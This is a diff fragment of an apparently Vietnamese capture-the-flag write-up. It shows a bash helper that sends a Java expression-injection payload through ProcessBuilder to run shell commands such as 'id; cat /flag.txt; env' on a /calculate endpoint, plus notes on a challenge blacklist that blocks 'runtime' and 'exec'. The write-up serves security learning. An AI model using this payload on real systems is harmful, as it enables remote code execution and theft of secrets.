@@ -125,8 +125,8 @@ bash
 `run(){ curl -s -m 40 -X POST $T/calculate \
   -H 'Content-Type: application/x-www-form-urlencoded' \
   --data-urlencode "expr=new java.lang.String(new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c','$1'}).start().getInputStream().readAllBytes())"; echo; }
-
 run 'id; cat /flag.txt; env'`
+
 Cái bẫy mất thời gian nhất của đề này là blacklist quét cả lệnh recon của chính mình. Lệnh nào chứa runtime hoặc exec — kể cả grep -rao "Runtime\|getRuntime" hay find -exec — đều trả {"status":"blocked"}. Đó không phải lỗi cú pháp; luôn đọc lại chuỗi lệnh trước khi gửi.
 
 08
